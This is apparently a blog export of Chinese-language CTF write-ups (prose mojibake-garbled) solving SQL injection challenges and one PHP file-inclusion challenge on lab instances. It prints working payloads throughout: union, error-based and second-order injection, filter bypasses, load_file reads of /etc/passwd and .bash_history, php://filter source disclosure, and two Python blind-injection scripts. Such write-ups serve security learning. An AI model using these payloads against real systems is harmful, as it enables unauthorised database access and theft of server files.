<p>name&#x3D;1â€™Order by 3#&amp;pw&#x3D;1	å¤§å°å†™ç»•è¿‡orderï¼ŒæŸ¥åˆ—</p>
<p><code>æœ¬é¢˜è€ƒç‚¹</code>ï¼š&#x3D;&#x3D;è”åˆæŸ¥è¯¢&#x3D;&#x3D;æ‰€æŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œè”åˆæŸ¥è¯¢ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®</p>
<p>name&#x3D;1â€™union select 1,â€™adminâ€™,â€™c4ca4238a0b923820dcc509a6f75849bâ€™#&amp;pw&#x3D;1</p>
<hr>
<h4 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h4><p>å’Œå¼ºç½‘æ¯é‚£é¢˜å¾ˆåƒï¼Œä½†æ˜¯è¿‡æ»¤äº†å…³é”®çš„renameï¼Œè¿™é‡Œç”¨handler</p>
<p>?inject&#x3D;1â€™;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
<p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚</p>
<hr>
<h4 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h4><p>å¸ƒå°”ç›²æ³¨+è„šæœ¬</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://8978ccf7-1a80-456a-8679-c416322d2b1d.node4.buuoj.cn:81/index.php"</span>
temp <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">&#125;</span>
re1 <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>temp<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>re1<span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">''</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        temp<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"1^(ascii(substr((select(flag)from(flag)),"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1))="</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">")"</span>
        re <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>temp<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> re <span class="token operator">==</span> re1<span class="token punctuation">:</span>
            flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h4><p>æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œå‘ä¸ªå¹¿å‘Šï¼Œåœ¨å¹¿å‘Šåå­—å‡ºæœ‰sqlæ³¨å…¥ã€‚</p>
<p>è¿‡æ»¤äº†or,â€“+,#ï¼Œè¿™é‡Œç”¨ <code>&#39;</code>ç»•è¿‡ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> æµ‹è¯•å‘ç°æœ‰22åˆ—</p>
<p>åœ¨2,3ä½ç½®å›æ˜¾</p>
<pre class="line-numbers language-none"><code class="language-none">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ•°æ®åº“web1</p>
<p>æ¥ä¸‹æ¥æŸ¥è¡¨</p>
<p>è¿™é‡Œæ²¡æœ‰åŠæ³•ä½¿ç”¨information_schema, åªèƒ½æ¢ç”¨åˆ«çš„è¡¨ã€‚è¿˜æœ‰å¦ä¸€ä¸ªè¡¨<strong>mysql.innodb_table_stats</strong>å¯ä»¥çœ‹è¡¨åã€æ•°æ®åº“åï¼Œå°±æ˜¯æ²¡æœ‰åˆ—åã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åæŸ¥åˆ—ï¼Œä½†æ˜¯mysql.innodb_table_statsä¸èƒ½æŸ¥åˆ—åï¼Œè¿™é‡Œç”¨&#x3D;&#x3D;æ— åˆ—åæ³¨å…¥&#x3D;&#x3D;</p>
<pre class="line-numbers language-none"><code class="language-none">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;b,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åçœ‹flag</p>
<pre class="line-numbers language-none"><code class="language-none">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h4 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h4><p>&#x3D;&#x3D;äºŒæ¬¡æ³¨å…¥&#x3D;&#x3D;</p>
<p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°å¯ä»¥ä¼ å‚fileï¼Œä½¿ç”¨ä¼ªåè®®è¯»å–æºç ã€‚</p>
<p>index.phpã€change.phpã€delete.phpã€search.phpã€config.php</p>
<p>åœ¨change.phpé‡Œé¢æœ‰sqlçš„updataè¯­å¥ï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p>
<p>å…¶å¯¹passwordå’Œusernameåšçš„è¿‡æ»¤ï¼Œå¾ˆéš¾ç»•è¿‡ï¼Œä½†æ˜¯å¯¹åœ°å€çš„è¿‡æ»¤å¾ˆå°‘ã€‚</p>
<p>é‚£æˆ‘ä»¬å¯ä»¥åœ¨ä¸€å¼€å§‹å‘é€ä¿¡æ¯çš„æ—¶å€™å¾€æ•°æ®åº“é‡Œæ’å…¥æ¶æ„è¯­å¥ï¼Œç„¶åä½¿change.phpè¿›è¡Œæ¶æ„æ³¨å…¥ã€‚</p>
<p>å·²çŸ¥flagåœ¨<code>/flag.txt</code>é‡Œé¢ï¼Œä½¿ç”¨<code>load_file</code>è¯»å–</p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">&quot;&#39;and updatexml(1,concat(0x23,load_file(&#39;&#x2F;flag.txt&#39;)),1)#
ä¸Šé¢åªèƒ½çˆ†å‡ºå‰é¢çš„flagï¼Œä¸å®Œæ•´ï¼Œä¸‹é¢ä½¿ç”¨midå‡½æ•°çˆ†åé¢çš„

&quot;&#39;and updatexml(1,concat(0x23,mid(load_file(&#39;&#x2F;flag.txt&#39;),32)),1)#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h4><p>&#x3D;&#x3D;äºŒæ¬¡æ³¨å…¥&#x3D;&#x3D;</p>
<p>æ³¨å†Œçš„æ—¶å€™å‘ç°äº†ä¸€äº›è¯è¢«è¿‡æ»¤æ‰äº†ï¼Œfuzzäº†ä¸€ä¸‹ï¼Œè¿‡æ»¤äº†éƒ¨åˆ†å­—ç¬¦</p>
<p>å½“<code>username</code>æ˜¯<code>1&quot;</code>æ—¶ï¼Œåœ¨ä¿®æ”¹å¯†ç çš„æ—¶å€™æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨äºŒæ¬¡æ³¨å…¥ï¼ŒåŒå¼•å·é—­åˆã€‚</p>
<p>å¯ä»¥æ¨å‡ºåå°çš„sqlè¯­å¥ä¸º</p>
<pre class="line-numbers language-none"><code class="language-none">update users set password&#x3D;&#39;xxxx&#39; where username&#x3D;&quot;xxxx&quot; and pwd&#x3D;&#39;202cb962ac59075b964b07152d234b70&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å› ä¸ºå­˜åœ¨æŠ¥é”™å›æ˜¾ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥ç”¨&#x3D;&#x3D;æŠ¥é”™æ³¨å…¥&#x3D;&#x3D;</p>
<p>1â€or(extractvalue(1,concat(0x7e,(database()))))#</p>
<p>çˆ†æ•°æ®åº“ï¼šweb_sqli</p>
<p>1â€or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;â€™web_sqliâ€™))))#</p>
<p>çˆ†è¡¨ï¼šarticle,flag,users</p>
<p>1â€or(extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name)&#x3D;â€™usersâ€™)))))#</p>
<p>çˆ†å­—æ®µï¼šname,pwd,email,real_flag_1s_here</p>
<p>1â€or(extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(â€˜^fâ€™))))))#</p>
<p>é€†åºè¾“å‡ºï¼š	}614aa102efe0-c999-dda4-62e2-32</p>
<p>æ­£åºåï¼š		23-2e26-4add-999c-0efe201aa416}</p>
<p>1â€or(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(â€˜^fâ€™)))))#</p>
<p>æœ€ç»ˆï¼šflag{42b76a23-2e26-4add-999c-0efe201aa416}</p>
<p><code>regexp(&#39;^f&#39;)</code>æ˜¯æŸ¥æ‰¾få¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</p>
<p><code>reverse()</code>æ˜¯é€†åºè¾“å‡º</p>
<hr>
<h4 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h4><p>&#x3D;&#x3D;GITæ³„éœ²&#x3D;&#x3D;  &#x3D;&#x3D;äºŒæ¬¡æ³¨å…¥&#x3D;&#x3D;</p>
<p>write_do.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into board
            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',
                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',
                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>
    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment
            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',
                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',
                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token keyword">default</span><span class="token punctuation">:</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">title&#x3D;23&amp;category&#x3D;1&#39;,content&#x3D;database(),&#x2F;*&amp;content&#x3D;3123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å†è®©content &#x3D; *&#x2F;#</p>
<p>æˆåŠŸè¯»åˆ°æ•°æ®åº“åç§°</p>
<p>title&#x3D;23&amp;category&#x3D;1â€™,content&#x3D;user(),&#x2F;*&amp;content&#x3D;3123</p>
<p>å‘ç°æ˜¯rootï¼Œè¿™æ ·çš„è¯ï¼Œä¸€èˆ¬ flag å°±ä¸ä¼šåœ¨æ•°æ®åº“é‡Œé¢(å› ä¸ºå¦‚æœåœ¨æ•°æ®åº“ä¸­ï¼Œä¸éœ€è¦rootæƒé™)</p>
<p>æ‰€ä»¥sqlæ³¨å…¥è¯»å–æœ¬åœ°æ–‡ä»¶ å¯ä»¥ä½¿ç”¨load_file()</p>
<p>å…ˆè¯»etc&#x2F;passwd</p>
<p>å‘ç°æœ‰ä¸ªwwwç”¨æˆ·<br>æŸ¥çœ‹<strong>bash_history ï¼š</strong> <strong>ä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤,æ–¹ä¾¿æŸ¥æ‰¾</strong><br>åœ¨&#x2F;home&#x2F;www&#x2F;ä¸‹<br>paylaod</p>
<pre class="line-numbers language-none"><code class="language-none">213&#39;,content&#x3D;(select load_file(&#39;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;)),&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>çœ‹è§ä»–åˆ é™¤äº†<code> .DS_Store</code> æ–‡ä»¶ï¼Œç”±äºç›®æ ‡ç¯å¢ƒæ˜¯dockerï¼Œæ‰€ä»¥ .DS_Store æ–‡ä»¶åº”è¯¥åœ¨ <code>/tmp/html</code> ä¸­ã€‚è€Œ .DS_Store æ–‡ä»¶ä¸­ï¼Œç»å¸¸ä¼šæœ‰ä¸€äº›ä¸å¯è§çš„å­—ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨<code>hex</code>å‡½æ•°å¯¹å…¶è¿›è¡Œ16è¿›åˆ¶è½¬æ¢</p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">213&#39;,content&#x3D;(select hex(load_file(&quot;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&quot;))),&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ”¾bpè§£ç ï¼Œflagåœ¨<code>flag_8946e1f1ee3e40f.php</code></p>
<p>title&#x3D;23&amp;category&#x3D;1â€™,content&#x3D;hex((load_file(â€˜&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.phpâ€™))),&#x2F;*&amp;content&#x3D;3123</p>
<p>è§£ç åå¾—åˆ°flag</p>
<hr>
<h4 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h4><p>idå­˜åœ¨æ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨å¼‚æˆ–æ³¨å…¥.</p>
<p>fuzzä¸€ä¸‹å‘ç°è¿‡æ»¤äº†informationï¼Œæ‰€ä»¥ä¸èƒ½ç”¨</p>
<p>å¯ä»¥ç”¨<code>sys.x$schema_flattened_keys</code>æˆ–è€…<code>sys.schema_table_statistics_with_buffer</code>ä»£æ›¿</p>
<pre class="line-numbers language-none"><code class="language-none">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;103
2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ä½†æ˜¯ä¸èƒ½æŸ¥å­—æ®µï¼Œæ‰€ä»¥è¦ç”¨åˆ°&#x3D;&#x3D;æ— åˆ—åæ³¨å…¥&#x3D;&#x3D;</p>
<p>è¿™é‡Œç”¨åˆ°äº†<code>asciiä½åç§»</code></p>
<p>æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²çš„å¤§å°ä¸å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯æ²¡æœ‰å…³ç³»çš„ï¼Œç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¼šå„å–ä¸¤ä¸ªå­—ç¬¦ä¸²çš„é¦–å­—ç¬¦asciiç æ¥æ¯”è¾ƒï¼Œä¸ç­‰å¼æˆç«‹è¿”å›1ï¼Œä¸ç­‰å¼ä¸æˆç«‹è¿”å›0ï¼Œæ¢ä¸€ä¸ªè§’åº¦æ¥è¯´ï¼Œåªä¼šæ¯”è¾ƒä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯é¦–å­—ç¬¦</p>
<p>è„šæœ¬ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">'http://bfd71058-3cf0-4e87-8731-8935a651f051.node3.buuoj.cn/'</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token string">''</span>
    res <span class="token operator">+=</span> flag
    <span class="token keyword">return</span> res
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        hexchar <span class="token operator">=</span> add<span class="token punctuation">(</span>flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string">'2||((select 1,"&#123;&#125;")>(select * from f1ag_1s_h3r3_hhhhh))'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>hexchar<span class="token punctuation">)</span>
        <span class="token comment">#print(payload)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        text <span class="token operator">=</span> r<span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>char<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<hr>
<h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h4 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h4><p>ç‚¹å‡»tipsï¼Œcan u find flag?</p>
<p>è¿™é‡Œç›´æ¥ä½¿ç”¨phpä¼ªåè®®ï¼Œä»¥base64ç¼–ç çš„å½¢å¼æ˜¾ç¤ºæºä»£ç </p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>å¾—åˆ°ä¸€ä¸²base64åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œè§£å¯†åå‘ç°flag</p>
<hr>
